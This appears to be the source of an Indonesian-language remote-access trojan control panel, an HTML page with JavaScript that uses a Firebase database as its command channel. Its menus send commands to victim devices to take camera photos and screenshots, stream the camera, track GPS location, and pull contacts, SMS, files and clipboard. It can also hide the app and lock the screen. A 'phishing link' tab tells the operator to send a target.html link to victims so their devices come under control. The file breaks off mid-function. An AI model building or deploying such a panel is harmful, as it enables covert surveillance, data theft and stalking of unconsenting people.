<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <title>RAT Panel | Ultimate Control</title>
    <link href="https://fonts.googleapis.com/css2?family=Rajdhani:wght@400;500;600;700&family=Share+Tech+Mono&display=swap" rel="stylesheet">
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            -webkit-tap-highlight-color: transparent;
        }

        :root {
            --bg: #0a1628;
            --card: #0d1e35;
            --card2: #111f38;
            --border: #1a3050;
            --blue: #1e90ff;
            --cyan: #00bfff;
            --accent: #1565c0;
            --text: #c8daf0;
            --text2: #5a8ab0;
            --text3: #3a6080;
            --green: #00e676;
            --red: #ff5252;
            --orange: #ff9800;
            --yellow: #ffe600;
            --purple: #9c27b0;
            --pink: #ff4081;
        }

        html, body {
            height: 100%;
            background: var(--bg);
            font-family: 'Rajdhani', sans-serif;
            color: var(--text);
            overflow-x: hidden;
        }

        .statusbar {
            display: flex;
            justify-content: space-between;
            align-items: center;
            padding: 10px 16px 6px;
            background: #060e1a;
            font-size: 12px;
            color: #aaa;
            font-family: 'Share Tech Mono', monospace;
            position: sticky;
            top: 0;
            z-index: 100;
        }

        .sb-left { display: flex; align-items: center; gap: 6px; }
        .sb-right { display: flex; align-items: center; gap: 5px; font-size: 11px; }
        .sb-time { font-size: 14px; font-weight: 600; color: #fff; }
        .batt { display: flex; align-items: center; gap: 2px; }
        .batt-bar { width: 22px; height: 11px; border: 1.5px solid #aaa; border-radius: 2px; position: relative; padding: 1.5px; }
        .batt-tip { width: 2px; height: 5px; background: #aaa; border-radius: 0 1px 1px 0; margin-left: 1px; }
        .batt-fill { height: 100%; background: var(--green); border-radius: 1px; width: 33%; }

        .device-card {
            background: linear-gradient(135deg, #0d1e35, #112240);
            border-bottom: 1px solid var(--border);
            padding: 14px 16px;
            display: flex;
            align-items: center;
            gap: 14px;
        }

        .device-icon { width: 52px; height: 52px; background: linear-gradient(135deg, #1565c0, #1e90ff); border-radius: 12px; display: flex; align-items: center; justify-content: center; font-size: 22px; }
        .device-info { flex: 1; }
        .device-name { font-size: 16px; font-weight: 700; color: #fff; letter-spacing: 1px; }
        .device-sub { font-size: 11px; color: var(--cyan); display: flex; align-items: center; gap: 5px; margin-top: 2px; }
        .online-dot { width: 7px; height: 7px; background: var(--green); border-radius: 50%; box-shadow: 0 0 6px var(--green); animation: blink 2s infinite; }
        @keyframes blink { 0%,100% { opacity: 1; } 50% { opacity: .4; } }
        .device-pct { font-size: 28px; font-weight: 700; color: var(--blue); font-family: 'Share Tech Mono', monospace; }

        .tabs {
            display: flex;
            background: #060e1a;
            border-bottom: 1px solid var(--border);
            position: sticky;
            top: 38px;
            z-index: 99;
            overflow-x: auto;
        }
        .tab { flex: 1; padding: 12px 0; text-align: center; font-size: 12px; font-weight: 600; color: var(--text2); cursor: pointer; transition: all .2s; position: relative; white-space: nowrap; }
        .tab.active { color: #fff; background: linear-gradient(180deg, transparent, rgba(30,144,255,0.08)); }
        .tab.active::after { content: ''; position: absolute; bottom: 0; left: 10%; width: 80%; height: 2.5px; background: linear-gradient(90deg, transparent, var(--blue), transparent); }
        .tab-icon { font-size: 16px; display: block; margin-bottom: 2px; }

        .page { display: none; padding-bottom: 80px; }
        .page.active { display: block; }

        .section { padding: 14px 14px 4px; }
        .section-header { display: flex; align-items: center; gap: 8px; margin-bottom: 2px; }
        .section-icon { width: 26px; height: 26px; border-radius: 6px; display: flex; align-items: center; justify-content: center; font-size: 13px; }
        .section-title { font-size: 11px; font-weight: 700; letter-spacing: 2px; color: var(--cyan); }

        .action-list { background: var(--card); border-radius: 12px; overflow: hidden; border: 1px solid var(--border); }
        .action-item { display: flex; align-items: center; gap: 13px; padding: 14px 14px; border-bottom: 1px solid rgba(26,48,80,0.6); cursor: pointer; transition: background .15s; }
        .action-item:last-child { border-bottom: none; }
        .action-item:active { background: rgba(30,144,255,0.08); }
        .ai-icon { width: 36px; height: 36px; border-radius: 10px; display: flex; align-items: center; justify-content: center; font-size: 17px; flex-shrink: 0; }
        .ai-icon.blue { background: rgba(30,144,255,0.15); border: 1px solid rgba(30,144,255,0.25); }
        .ai-icon.green { background: rgba(0,230,118,0.12); border: 1px solid rgba(0,230,118,0.2); }
        .ai-icon.red { background: rgba(255,82,82,0.12); border: 1px solid rgba(255,82,82,0.2); }
        .ai-icon.orange { background: rgba(255,152,0,0.12); border: 1px solid rgba(255,152,0,0.2); }
        .ai-icon.cyan { background: rgba(0,191,255,0.12); border: 1px solid rgba(0,191,255,0.2); }
        .ai-icon.yellow { background: rgba(255,230,0,0.12); border: 1px solid rgba(255,230,0,0.2); }
        .ai-icon.purple { background: rgba(156,39,176,0.12); border: 1px solid rgba(156,39,176,0.2); }
        .ai-icon.pink { background: rgba(255,64,129,0.12); border: 1px solid rgba(255,64,129,0.2); }
        .ai-text { flex: 1; }
        .ai-name { font-size: 15px; font-weight: 600; color: #d8eaff; letter-spacing: .3px; }
        .ai-desc { font-size: 11px; color: var(--text2); margin-top: 1px; }
        .action-chevron { color: var(--text3); font-size: 13px; margin-left: 4px; }
        .badge { display: inline-block; padding: 2px 8px; border-radius: 10px; font-size: 10px; font-weight: 700; }
        .badge.green { background: rgba(0,230,118,0.15); color: var(--green); border: 1px solid rgba(0,230,118,0.3); }
        .badge.red { background: rgba(255,82,82,0.15); color: var(--red); border: 1px solid rgba(255,82,82,0.3); }
        .badge.blue { background: rgba(30,144,255,0.15); color: var(--blue); border: 1px solid rgba(30,144,255,0.3); }

        .log-box { background: #060e1a; border: 1px solid var(--border); border-radius: 10px; padding: 10px 12px; height: 160px; overflow-y: auto; font-family: 'Share Tech Mono', monospace; font-size: 11px; color: #3a6080; }
        .log-line { padding: 2px 0; border-bottom: 1px solid rgba(26,48,80,0.3); }
        .log-line.ok { color: var(--green); }
        .log-line.warn { color: var(--orange); }
        .log-line.err { color: var(--red); }
        .log-line.info { color: var(--cyan); }

        #toast { position: fixed; bottom: 90px; left: 50%; transform: translateX(-50%) translateY(20px); background: rgba(13,30,53,0.97); border: 1px solid var(--blue); border-radius: 10px; padding: 10px 18px; font-size: 12px; color: #fff; z-index: 9999; opacity: 0; transition: all .3s; pointer-events: none; white-space: nowrap; }
        #toast.show { opacity: 1; transform: translateX(-50%) translateY(0); }

        .gap8 { margin-top: 8px; }
        .link-box { margin-top: 20px; padding: 15px; background: rgba(0,0,0,0.3); border-radius: 15px; }
        .link-box input { width: 100%; background: #1a1a2e; border: 1px solid #333; padding: 12px; border-radius: 10px; color: #fff; font-size: 11px; margin-top: 8px; }
        .slider-row { padding: 12px 14px; background: var(--card); border-radius: 10px; margin-bottom: 8px; border: 1px solid var(--border); }
        .slider-top { display: flex; justify-content: space-between; align-items: center; margin-bottom: 8px; }
        .slider-label { font-size: 12px; color: var(--text2); }
        .slider-val { font-size: 13px; font-weight: 700; color: var(--blue); font-family: 'Share Tech Mono', monospace; }
        input[type=range] { width: 100%; appearance: none; -webkit-appearance: none; height: 4px; border-radius: 2px; outline: none; cursor: pointer; background: linear-gradient(90deg, var(--blue) var(--p,50%), #1a2a40 var(--p,50%)); }
        input[type=range]::-webkit-slider-thumb { -webkit-appearance: none; width: 18px; height: 18px; border-radius: 50%; background: var(--blue); box-shadow: 0 0 8px rgba(30,144,255,0.6); border: 2px solid #fff; }
        .toggle { width: 44px; height: 24px; background: #1a2a40; border-radius: 12px; position: relative; border: 1px solid var(--border); cursor: pointer; transition: .3s; flex-shrink: 0; }
        .toggle::after { content: ''; position: absolute; width: 18px; height: 18px; background: #3a5a7a; border-radius: 50%; top: 2px; left: 2px; transition: .3s; }
        .toggle.on { background: rgba(30,144,255,0.3); border-color: var(--blue); }
        .toggle.on::after { left: 22px; background: var(--blue); box-shadow: 0 0 8px var(--blue); }
        .info-row { display: flex; justify-content: space-between; padding: 8px 0; border-bottom: 1px solid rgba(26,48,80,0.4); font-size: 13px; }
        .info-key { color: var(--text2); }
        .info-val { color: #d8eaff; font-family: 'Share Tech Mono', monospace; font-size: 12px; }
        video, canvas { display: none; }
    </style>
</head>
<body>

<div class="statusbar">
    <div class="sb-left"><span class="sb-time" id="sbTime">--:--</span><span style="font-size:9px">›_ ULTIMATE RAT</span></div>
    <div class="sb-right"><span>📶</span><span id="sbBatt">--%</span><div class="batt"><div class="batt-bar"><div class="batt-fill" id="battFill"></div></div><div class="batt-tip"></div></div></div>
</div>

<div class="device-card">
    <div class="device-icon">📱</div>
    <div class="device-info">
        <div class="device-name" id="deviceName">No Device</div>
        <div class="device-sub"><div class="online-dot"></div><span id="deviceStatus">Select Device</span></div>
    </div>
    <div class="device-pct" id="devPct">--%</div>
</div>

<div class="tabs">
    <div class="tab" onclick="goTab(0)"><span class="tab-icon">🎮</span>KONTROL</div>
    <div class="tab" onclick="goTab(1)"><span class="tab-icon">📊</span>STATS</div>
    <div class="tab" onclick="goTab(2)"><span class="tab-icon">🔗</span>DEVICES</div>
    <div class="tab" onclick="goTab(3)"><span class="tab-icon">⚡</span>AUTO</div>
    <div class="tab" onclick="goTab(4)"><span class="tab-icon">📋</span>LOG</div>
</div>

<div id="toast"></div>

<!-- PAGE 0: KONTROL UTAMA -->
<div class="page active" id="pg0">
    <!-- FLASHLIGHT -->
    <div class="section"><div class="section-header"><div class="section-icon" style="background:rgba(255,230,0,0.15)">⚡</div><span class="section-title">FLASHLIGHT</span></div>
    <div class="action-list gap8">
        <div class="action-item" onclick="sendCmd('flash_on')"><div class="ai-icon yellow">⚡</div><div class="ai-text"><div class="ai-name">Flashlight ON</div><div class="ai-desc">Nyalakan senter</div></div><span class="action-chevron">›</span></div>
        <div class="action-item" onclick="sendCmd('flash_off')"><div class="ai-icon blue">⚫</div><div class="ai-text"><div class="ai-name">Flashlight OFF</div><div class="ai-desc">Matikan senter</div></div><span class="action-chevron">›</span></div>
        <div class="action-item" onclick="sendCmd('flash_sos_slow')"><div class="ai-icon orange">🆘</div><div class="ai-text"><div class="ai-name">SOS Slow</div><div class="ai-desc">Senter kedip lambat (500ms)</div></div><span class="action-chevron">›</span></div>
        <div class="action-item" onclick="sendCmd('flash_sos_fast')"><div class="ai-icon red">🚨</div><div class="ai-text"><div class="ai-name">SOS Fast</div><div class="ai-desc">Senter kedip cepat (200ms)</div></div><span class="action-chevron">›</span></div>
    </div></div>

    <!-- VIBRATION -->
    <div class="section"><div class="section-header"><div class="section-icon" style="background:rgba(255,152,0,0.15)">📳</div><span class="section-title">VIBRATION</span></div>
    <div class="action-list gap8">
        <div class="action-item" onclick="sendCmd('vibrate_once')"><div class="ai-icon orange">📳</div><div class="ai-text"><div class="ai-name">Short Vibrate</div><div class="ai-desc">Getar 500ms</div></div><span class="action-chevron">›</span></div>
        <div class="action-item" onclick="sendCmd('vibrate_long')"><div class="ai-icon red">📳</div><div class="ai-text"><div class="ai-name">Long Vibrate</div><div class="ai-desc">Getar 2000ms</div></div><span class="action-chevron">›</span></div>
        <div class="action-item" onclick="sendCmd('vibrate_pattern')"><div class="ai-icon purple">📳</div><div class="ai-text"><div class="ai-name">Pattern Vibrate</div><div class="ai-desc">Getar pola unik</div></div><span class="action-chevron">›</span></div>
        <div class="action-item" onclick="sendCmd('vibrate_continuous')"><div class="ai-icon pink">📳</div><div class="ai-text"><div class="ai-name">Continuous Vibrate</div><div class="ai-desc">Getar terus menerus</div></div><span class="action-chevron">›</span></div>
        <div class="action-item" onclick="sendCmd('vibrate_stop')"><div class="ai-icon green">⏹️</div><div class="ai-text"><div class="ai-name">Stop Vibrate</div><div class="ai-desc">Hentikan getaran</div></div><span class="action-chevron">›</span></div>
    </div></div>

    <!-- CAMERA -->
    <div class="section"><div class="section-header"><div class="section-icon" style="background:rgba(0,230,118,0.15)">📷</div><span class="section-title">CAMERA</span></div>
    <div class="action-list gap8">
        <div class="action-item" onclick="sendCmd('photo_front')"><div class="ai-icon cyan">🤳</div><div class="ai-text"><div class="ai-name">Photo Front</div><div class="ai-desc">Ambil foto kamera depan</div></div><span class="action-chevron">›</span></div>
        <div class="action-item" onclick="sendCmd('photo_rear')"><div class="ai-icon green">📷</div><div class="ai-text"><div class="ai-name">Photo Rear</div><div class="ai-desc">Ambil foto kamera belakang</div></div><span class="action-chevron">›</span></div>
        <div class="action-item" onclick="sendCmd('screenshot')"><div class="ai-icon blue">📱</div><div class="ai-text"><div class="ai-name">Screenshot</div><div class="ai-desc">Ambil screenshot layar</div></div><span class="action-chevron">›</span></div>
        <div class="action-item" onclick="sendCmd('live_camera')"><div class="ai-icon purple">🎥</div><div class="ai-text"><div class="ai-name">Live Camera</div><div class="ai-desc">Stream kamera langsung</div></div><span class="action-chevron">›</span></div>
    </div></div>

    <!-- LOCATION -->
    <div class="section"><div class="section-header"><div class="section-icon" style="background:rgba(0,191,255,0.15)">📍</div><span class="section-title">LOCATION & GPS</span></div>
    <div class="action-list gap8">
        <div class="action-item" onclick="sendCmd('get_location')"><div class="ai-icon cyan">📍</div><div class="ai-text"><div class="ai-name">Get Location</div><div class="ai-desc" id="gpsDesc">Ambil koordinat GPS</div></div><span class="action-chevron">›</span></div>
        <div class="action-item" onclick="sendCmd('start_tracking')"><div class="ai-icon green">🔄</div><div class="ai-text"><div class="ai-name">Start Tracking</div><div class="ai-desc">Tracking lokasi otomatis</div></div><span class="action-chevron">›</span></div>
        <div class="action-item" onclick="sendCmd('stop_tracking')"><div class="ai-icon red">⏹️</div><div class="ai-text"><div class="ai-name">Stop Tracking</div><div class="ai-desc">Hentikan tracking</div></div><span class="action-chevron">›</span></div>
    </div></div>

    <!-- DEVICE CONTROL -->
    <div class="section"><div class="section-header"><div class="section-icon" style="background:rgba(30,144,255,0.15)">🎛️</div><span class="section-title">DEVICE CONTROL</span></div>
    <div class="action-list gap8">
        <div class="action-item" onclick="sendCmd('get_info')"><div class="ai-icon blue">🔍</div><div class="ai-text"><div class="ai-name">Get Device Info</div><div class="ai-desc">Ambil informasi lengkap device</div></div><span class="action-chevron">›</span></div>
        <div class="action-item" onclick="sendCmd('get_battery')"><div class="ai-icon green">🔋</div><div class="ai-text"><div class="ai-name">Get Battery Info</div><div class="ai-desc">Ambil status baterai</div></div><span class="action-chevron">›</span></div>
        <div class="action-item" onclick="sendCmd('get_contacts')"><div class="ai-icon cyan">📞</div><div class="ai-text"><div class="ai-name">Get Contacts</div><div class="ai-desc">Ambil daftar kontak</div></div><span class="action-chevron">›</span></div>
        <div class="action-item" onclick="sendCmd('get_sms')"><div class="ai-icon orange">💬</div><div class="ai-text"><div class="ai-name">Get SMS</div><div class="ai-desc">Ambil pesan SMS</div></div><span class="action-chevron">›</span></div>
        <div class="action-item" onclick="sendCmd('get_files')"><div class="ai-icon purple">📁</div><div class="ai-text"><div class="ai-name">Get Files List</div><div class="ai-desc">Ambil daftar file</div></div><span class="action-chevron">›</span></div>
        <div class="action-item" onclick="sendCmd('get_clipboard')"><div class="ai-icon yellow">📋</div><div class="ai-text"><div class="ai-name">Get Clipboard</div><div class="ai-desc">Ambil isi clipboard</div></div><span class="action-chevron">›</span></div>
    </div></div>

    <!-- SCREEN CONTROL -->
    <div class="section"><div class="section-header"><div class="section-icon" style="background:rgba(255,64,129,0.15)">🖥️</div><span class="section-title">SCREEN CONTROL</span></div>
    <div class="action-list gap8">
        <div class="action-item" onclick="sendCmd('lock_screen')"><div class="ai-icon pink">🔒</div><div class="ai-text"><div class="ai-name">Lock Screen</div><div class="ai-desc">Kunci layar device</div></div><span class="action-chevron">›</span></div>
        <div class="action-item" onclick="sendCmd('unlock_screen')"><div class="ai-icon green">🔓</div><div class="ai-text"><div class="ai-name">Unlock Screen</div><div class="ai-desc">Buka kunci layar</div></div><span class="action-chevron">›</span></div>
        <div class="action-item" onclick="sendCmd('hide_app')"><div class="ai-icon cyan">👻</div><div class="ai-text"><div class="ai-name">Hide App</div><div class="ai-desc">Sembunyikan aplikasi</div></div><span class="action-chevron">›</span></div>
        <div class="action-item" onclick="sendCmd('show_app')"><div class="ai-icon blue">👁️</div><div class="ai-text"><div class="ai-name">Show App</div><div class="ai-desc">Tampilkan aplikasi</div></div><span class="action-chevron">›</span></div>
    </div></div>

    <!-- BROWSER -->
    <div class="section"><div class="section-header"><div class="section-icon" style="background:rgba(156,39,176,0.15)">🌐</div><span class="section-title">BROWSER</span></div>
    <div class="action-list gap8">
        <div class="action-item" onclick="sendCmd('open_website', 'https://google.com')"><div class="ai-icon purple">🌐</div><div class="ai-text"><div class="ai-name">Open Google</div><div class="ai-desc">Buka Google di browser</div></div><span class="action-chevron">›</span></div>
        <div class="action-item" onclick="sendCmd('open_website', 'https://youtube.com')"><div class="ai-icon red">📺</div><div class="ai-text"><div class="ai-name">Open YouTube</div><div class="ai-desc">Buka YouTube</div></div><span class="action-chevron">›</span></div>
        <div class="action-item" onclick="sendCmd('open_website', 'https://tiktok.com')"><div class="ai-icon orange">🎵</div><div class="ai-text"><div class="ai-name">Open TikTok</div><div class="ai-desc">Buka TikTok</div></div><span class="action-chevron">›</span></div>
        <div class="action-item" onclick="sendCmd('open_website', 'https://instagram.com')"><div class="ai-icon pink">📸</div><div class="ai-text"><div class="ai-name">Open Instagram</div><div class="ai-desc">Buka Instagram</div></div><span class="action-chevron">›</span></div>
    </div></div>

    <!-- NOTIFICATION -->
    <div class="section"><div class="section-header"><div class="section-icon" style="background:rgba(255,82,82,0.15)">🔔</div><span class="section-title">NOTIFICATION & ALERT</span></div>
    <div class="action-list gap8">
        <div class="action-item" onclick="sendCmd('show_notification', 'Pesan dari Admin!')"><div class="ai-icon red">🔔</div><div class="ai-text"><div class="ai-name">Show Notification</div><div class="ai-desc">Tampilkan notifikasi</div></div><span class="action-chevron">›</span></div>
        <div class="action-item" onclick="sendCmd('show_alert', 'Peringatan!')"><div class="ai-icon orange">⚠️</div><div class="ai-text"><div class="ai-name">Show Alert</div><div class="ai-desc">Tampilkan popup alert</div></div><span class="action-chevron">›</span></div>
        <div class="action-item" onclick="sendCmd('toast_message', 'Hello from RAT!')"><div class="ai-icon cyan">💬</div><div class="ai-text"><div class="ai-name">Toast Message</div><div class="ai-desc">Tampilkan toast message</div></div><span class="action-chevron">›</span></div>
    </div></div>

    <!-- EMERGENCY -->
    <div class="section"><div class="section-header"><div class="section-icon" style="background:rgba(255,82,82,0.15)">🛑</div><span class="section-title">EMERGENCY</span></div>
    <div class="action-list gap8">
        <div class="action-item" onclick="sendCmd('emergency_stop')"><div class="ai-icon red">⛔</div><div class="ai-text"><div class="ai-name">Emergency Stop</div><div class="ai-desc">Matikan semua aksi (flash/sos/vibrate)</div></div><span class="action-chevron">›</span></div>
        <div class="action-item" onclick="sendCmd('reboot_device')"><div class="ai-icon orange">🔄</div><div class="ai-text"><div class="ai-name">Reboot Device</div><div class="ai-desc">Restart device (butuh izin)</div></div><span class="action-chevron">›</span></div>
        <div class="action-item" onclick="sendCmd('shutdown_device')"><div class="ai-icon red">⏻</div><div class="ai-text"><div class="ai-name">Shutdown Device</div><div class="ai-desc">Matikan device (butuh izin)</div></div><span class="action-chevron">›</span></div>
    </div></div>
</div>

<!-- PAGE 1: STATS -->
<div class="page" id="pg1">
    <div class="section">
        <div class="section-header"><div class="section-icon" style="background:rgba(30,144,255,0.15)">📊</div><span class="section-title">DEVICE STATISTICS</span></div>
        <div class="action-list gap8" style="padding: 12px 14px">
            <div class="info-row"><span class="info-key">📱 Model</span><span class="info-val" id="statModel">--</span></div>
            <div class="info-row"><span class="info-key">💻 Platform</span><span class="info-val" id="statPlatform">--</span></div>
            <div class="info-row"><span class="info-key">📺 Screen</span><span class="info-val" id="statScreen">--</span></div>
            <div class="info-row"><span class="info-key">🔋 Battery</span><span class="info-val" id="statBattery">--</span></div>
            <div class="info-row"><span class="info-key">⚡ Charging</span><span class="info-val" id="statCharging">--</span></div>
            <div class="info-row"><span class="info-key">🌐 IP Address</span><span class="info-val" id="statIP">--</span></div>
            <div class="info-row"><span class="info-key">📍 Location</span><span class="info-val" id="statLocation">--</span></div>
            <div class="info-row"><span class="info-key">🕐 Last Seen</span><span class="info-val" id="statLastSeen">--</span></div>
            <div class="info-row"><span class="info-key">📶 Online Status</span><span class="info-val"><span class="badge green" id="statOnline">ONLINE</span></span></div>
        </div>
    </div>

    <div class="section">
        <div class="section-header"><div class="section-icon" style="background:rgba(0,230,118,0.15)">📊</div><span class="section-title">PERFORMANCE</span></div>
        <div class="action-list gap8" style="padding: 12px 14px">
            <div class="info-row"><span class="info-key">📱 Device ID</span><span class="info-val" id="statDeviceId" style="font-size:10px">--</span></div>
            <div class="info-row"><span class="info-key">📦 RAM</span><span class="info-val" id="statRam">--</span></div>
            <div class="info-row"><span class="info-key">🧠 CPU Cores</span><span class="info-val" id="statCpu">--</span></div>
            <div class="info-row"><span class="info-key">📱 Browser</span><span class="info-val" id="statBrowser">--</span></div>
        </div>
    </div>
</div>

<!-- PAGE 2: DEVICES LIST -->
<div class="page" id="pg2">
    <div class="section">
        <div class="section-header"><div class="section-icon" style="background:rgba(0,191,255,0.15)">🔗</div><span class="section-title">LINK PHISING</span></div>
        <div class="link-box">
            <div style="font-size: 11px; color: #888;">📱 KIRIM LINK INI KE TARGET</div>
            <input type="text" id="phishLink" readonly value="Loading..." onclick="this.select()">
            <p style="font-size: 10px; color: #888; margin-top: 8px;">Target buka link → otomatis online → bisa dikontrol</p>
        </div>
    </div>

    <div class="section">
        <div class="section-header"><div class="section-icon" style="background:rgba(30,144,255,0.15)">📱</div><span class="section-title">ONLINE DEVICES</span></div>
        <div class="action-list gap8" id="deviceList">
            <div style="text-align:center; padding:20px; color:#888;">🔌 Menunggu device online...</div>
        </div>
    </div>
</div>

<!-- PAGE 3: AUTOMATION -->
<div class="page" id="pg3">
    <div class="section">
        <div class="section-header"><div class="section-icon" style="background:rgba(0,230,118,0.15)">🤖</div><span class="section-title">AUTO ACTIONS</span></div>
        <div class="action-list gap8">
            <div class="action-item" onclick="toggleAutoFlash()"><div class="ai-icon yellow">⚡</div><div class="ai-text"><div class="ai-name">Auto Flash</div><div class="ai-desc" id="autoFlashDesc">Flash kelap-kelip otomatis</div></div><div class="toggle" id="autoFlashToggle"></div></div>
            <div class="action-item" onclick="toggleAutoVibrate()"><div class="ai-icon orange">📳</div><div class="ai-text"><div class="ai-name">Auto Vibrate</div><div class="ai-desc" id="autoVibDesc">Getar otomatis tiap 10 detik</div></div><div class="toggle" id="autoVibToggle"></div></div>
            <div class="action-item" onclick="toggleAutoTracking()"><div class="ai-icon cyan">📍</div><div class="ai-text"><div class="ai-name">Auto Tracking</div><div class="ai-desc" id="autoTrackDesc">Tracking lokasi otomatis</div></div><div class="toggle" id="autoTrackToggle"></div></div>
        </div>
    </div>

    <div class="section">
        <div class="section-header"><div class="section-icon" style="background:rgba(255,152,0,0.15)">⏱️</div><span class="section-title">TIMER SETTINGS</span></div>
        <div class="slider-row">
            <div class="slider-top"><span class="slider-label">AUTO FLASH SPEED</span><span class="slider-val" id="flashSpeedVal">500ms</span></div>
            <input type="range" min="100" max="2000" value="500" step="100" oninput="setFlashSpeed(this.value)">
        </div>
        <div class="slider-row">
            <div class="slider-top"><span class="slider-label">AUTO VIBRATE INTERVAL</span><span class="slider-val" id="vibIntervalVal">10s</span></div>
            <input type="range" min="5" max="60" value="10" step="5" oninput="setVibInterval(this.value)">
        </div>
    </div>
</div>

<!-- PAGE 4: LOG -->
<div class="page" id="pg4">
    <div class="section">
        <div class="section-header"><div class="section-icon" style="background:rgba(0,230,118,0.15)">📋</div><span class="section-title">ACTIVITY LOG</span></div>
        <div class="log-box" id="syslog">
            <div class="log-line ok">🟢 RAT Panel Ultimate Ready</div>
            <div class="log-line info">📡 Firebase Connected</div>
            <div class="log-line info">🎯 Select device to control</div>
        </div>
    </div>
</div>

<script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-app-compat.js"></script>
<script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-database-compat.js"></script>

<script>
    const firebaseConfig = {
        apiKey: "AIzaSyDhe2xXT8AYMXf-YnCFrpWDQazTfPXcxag",
        authDomain: "thinxrat.firebaseapp.com",
        databaseURL: "https://thinxrat-default-rtdb.asia-southeast1.firebasedatabase.app",
        projectId: "thinxrat",
        storageBucket: "thinxrat.firebasestorage.app",
        messagingSenderId: "533724874987",
        appId: "1:533724874987:web:a4eebbf4069e81d3a956ae",
    };
    firebase.initializeApp(firebaseConfig);
    const database = firebase.database();

    let selectedDeviceId = null;
    let onlineDevices = {};
    let autoFlashInterval = null, autoFlashOn = false, flashSpeed = 500;
    let autoVibInterval = null, autoVibOn = false, vibIntervalSec = 10;
    let autoTrackInterval = null, autoTrackOn = false;

    function updateClock() {
        const n = new Date();
        const pad = v => String(v).padStart(2, '0');
        document.getElementById('sbTime').textContent = pad(n.getHours()) + ':' + pad(n.getMinutes());
    }
    setInterval(updateClock, 1000); updateClock();

    async function initBattery() {
        try {
            const b = await navigator.getBattery();
            const upd = () => {
                const p = Math.round(b.level * 100);
                document.getElementById('sbBatt').textContent = p + '%';
                document.getElementById('battFill').style.width = p + '%';
            };
            upd();
            b.addEventListener('levelchange', upd);
        } catch(e) {}
    }
    initBattery();

    function toast(msg) {
        const t = document.getElementById('toast');
        t.textContent = msg;
        t.classList.add('show');
        setTimeout(() => t.classList.remove('show'), 2500);
    }

    function addLog(msg, type = 'info') {
        const logEl = document.getElementById('syslog');
        if (!logEl) return;
        const d = document.createElement('div');
        d.className = 'log-line ' + type;
        d.textContent = '[' + new Date().toLocaleTimeString() + '] ' + msg;
        logEl.insertBefore(d, logEl.firstChild);
        if (logEl.children.length > 100) logEl.lastChild.remove();
    }

    function goTab(n) {
        document.querySelectorAll('.tab').forEach((t, i) => t.classList.toggle('active', i === n));
        document.querySelectorAll('.page').forEach((p, i) => p.classList.toggle('active', i === n));
        scrollTo({ top: 0, behavior: 'smooth' });
    }

    function getPhishLink() {
        const currentUrl = window.location.href;
        if (currentUrl.includes('panel.html')) return currentUrl.replace('panel.html', 'target.html');
        if (currentUrl.includes('index.html')) return currentUrl.replace('index.html', 'target.html');
        return window.location.origin + '/target.html';
    }
    document.getElementById('phishLink').value = getPhishLink();

    async function sendCmd(command, value = null) {
        if (!selectedDeviceId) {
            toast('❌ Pilih device dulu!');
            addLog('❌ Pilih device dulu!', 'err');
            return;
        }
        try {
            await database.ref(`devices/${selectedDeviceId}/command`).set({
                action: command, value: value, timestamp: Date.now(), from: 'panel'
            });
            addLog(`📤 ${command} → ${selectedDeviceId.substring(0, 8)}...`, 'info');
            toast(`✅ ${command} terkirim!`);
        } catch(e) {
            addLog(`❌ Gagal: ${e.message}`, 'err');
            toast(`❌ Gagal: ${e.message}`);
        }
    }

    function isDeviceOnline(device) {
        return (Date.now() - (device.lastSeen || 0)) < 30000;
    }

    function selectDevice(deviceId, device) {
        selectedDeviceId = deviceId;
        document.getElementById('deviceName').innerHTML = device.model || 'Unknown';
        document.getElementById('devPct').innerHTML = (device.battery || '?') + '%';
        document.getElementById('deviceStatus').innerHTML = 'Online';
        
        // Update stats page
        document.getElementById('statModel').innerHTML = device.model || '--';
        document.getElementById('statPlatform').innerHTML = device.platform || '--';
        document.getElementById('statScreen').innerHTML = device.screen || '--';
        document.getElementById('statBattery').innerHTML = (device.battery || '?') + '%';
        document.getElementById('statCharging').innerHTML = device.charging ? '✅ Yes' : '❌ No';
        document.getElementById('statIP').innerHTML = device.ip || '--';
        document.getElementById('statLocation').innerHTML = (device.city || '--') + ', ' + (device.country || '--');
        document.getElementById('statDeviceId').innerHTML = deviceId.substring(0, 20) + '...';
        document.getElementById('statRam').innerHTML = device.ram || '--';
        document.getElementById('statCpu').innerHTML = device.cores || '--';
        document.getElementById('statBrowser').innerHTML = device.platform || '--';
        
        addLog(`🎯 Mengontrol: ${device.model || deviceId.substring(0, 12)}`, 'ok');
        toast(`✅ Mengontrol ${device.model || 'Device'}`);
    }

    function renderDevices(snapshot) {
        const allDevices = snapshot.val();
        const deviceListDiv = document.getElementById('deviceList');
        const onlineDevicesList = [];
        
        if (allDevices) {
            for (const [id, device] of Object.entries(allDevices)) {
                if (isDeviceOnline(device)) {
                    onlineDevicesList.push({ id, ...device });
                    onlineDevices[id] = device;
                } else {
                    delete onlineDevices[id];
                }
            }
        }
        
        if (onlineDevicesList.length === 0) {
            deviceListDiv.innerHTML = `<div style="text-align:center; padding:20px; color:#888;">🔌 Tidak ada device online<br><span style="font-size:11px;">Kirim link ke target</span></div>`;
            if (selectedDeviceId) {
                selectedDeviceId = null;
                document.getElementById('deviceName').innerHTML = 'No Device';
                document.getElementById('devPct').innerHTML = '--%';
                document.getElementById('deviceStatus').innerHTML = 'Select Device';
            }
            return;
        }
        
        let html = '';
        for (const device of onlineDevicesList) {
            const isActive = (selectedDeviceId === device.id);
            html += `
                <div class="action-item" style="cursor:pointer" onclick='selectDevice("${device.id}", ${JSON.stringify(device).replace(/"/g, '&quot;')})'>
                    <div class="ai-icon ${isActive ? 'blue' : 'cyan'}">📱</div>
                    <div class="ai-text">
                        <div class="ai-name">${device.model || 'Unknown'}</div>
                        <div class="ai-desc">📍 ${device.city || 'Unknown'}, ${device.country || ''} | 🔋 ${device.battery || '?'}%</div>
                    </div>
                    <span class="action-chevron">${isActive ? '●' : '›'}</span>
                </div>
            `;
        }
        deviceListDiv.innerHTML = html;
        
        if (!selectedDeviceId && onlineDevicesList.length > 0) {
            selectDevice(onlineDevicesList[0].id, onlineDevicesList[0]);
        }
    }

    // Auto Actions
    function toggleAutoFlash() {
        if (!selectedDeviceId) { toast('❌ Pilih device dulu!'); return; }
        autoFlashOn = !autoFlashOn;
        const toggle = document.getElementById('autoFlashToggle');
        const desc = document.getElementById('autoFlashDesc');
